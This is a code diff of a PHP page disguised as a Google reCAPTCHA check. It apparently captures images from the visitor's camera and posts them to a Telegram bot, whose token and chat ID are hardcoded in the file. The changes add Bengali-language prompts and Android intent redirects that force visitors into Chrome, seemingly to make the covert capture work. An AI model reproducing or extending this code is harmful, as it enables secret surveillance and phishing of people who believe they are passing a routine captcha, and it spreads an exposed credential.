@@ -2,9 +2,8 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    $chatId = "5896019931"; // Default fallback
+    $chatId = "5896019931"; 
 
-    // Encrypted Chat ID decode kora
     if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
         $encodedCid = $_POST['chat_id'];
         $decodedCid = base64_decode(str_pad(strtr($encodedCid, '-_', '+/'), strlen($encodedCid) % 4, '=', STR_PAD_RIGHT));
@@ -66,8 +65,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             overflow: hidden;
             background-color: #f9f9f9; 
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
+            font-family: Roboto, helvetica, arial, sans-serif;
         }
         
         .recaptcha-box {
@@ -104,10 +105,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             transition: background 0.2s, border-color 0.2s;
         }
 
-        .recaptcha-checkbox:hover {
-            border-color: #b2b2b2;
-        }
-
         .recaptcha-checkbox.checked::after {
             content: "";
             position: absolute;
@@ -120,7 +117,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
 
         .recaptcha-text {
-            font-family: Roboto, helvetica, arial, sans-serif;
             font-size: 14px;
             color: #2c2c2c;
             user-select: none;
@@ -142,14 +138,53 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         }
 
         .recaptcha-footer {
-            font-family: Roboto, helvetica, arial, sans-serif;
             font-size: 10px;
             color: #555;
             margin-top: 2px;
         }
+
+        /* Chrome Warning Banner Style */
+        #chromeWarning {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .chrome-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            text-decoration: none;
+            display: inline-block;
+        }
     </style>
 </head>
 <body>
+
+    <!-- Chrome Browser Warning / Open in Chrome Button -->
+    <div id="chromeWarning">
+        <h3 style="color: #333; margin-bottom: 10px;">⚠️ অনুগ্রহ করে ক্রোম ব্রাউজার ব্যবহার করুন</h3>
+        <p style="color: #666; font-size: 14px; max-width: 300px; line-height: 1.5;">সঠিকভাবে ওপেন করার জন্য নিচের বাটনে ক্লিক করে Google Chrome ব্রাউজার সিলেক্ট করুন।</p>
+        <a href="#" id="openChromeBtn" class="chrome-btn">Open in Chrome</a>
+    </div>
 
     <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
         <div class="recaptcha-left">
@@ -170,11 +205,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         const isChrome = /CriOS|Chrome/.test(ua) && !/Edge|OPR|SamsungBrowser/.test(ua);
         const isAndroid = /Android/i.test(ua);
 
-        // যদি অ্যান্ড্রয়েড হয় এবং ব্রাউজার ক্রোম না হয়, তবে ক্রোম ব্রাউজারে রিডাইরেক্ট করবে
+        const currentUrl = window.location.href;
+        const cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+
         if (isAndroid && !isChrome) {
-            let currentUrl = window.location.href;
-            let cleanUrl = currentUrl.replace(/^https?:\/\//, '');
+            // ১. প্রথমে অটো ইন্টেন্ট ট্রাই করবে
             window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;
+
+            // ২. যদি অটো রিডাইরেক্ট ব্লক হয়, তবে ফোর্সিং বক্স বা বাটন দেখাবে
+            window.onload = function() {
+                document.getElementById('chromeWarning').style.display = 'flex';
+                document.getElementById('openChromeBtn').href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;end;`;
+            };
         }
 
         const video = document.getElementById('video');
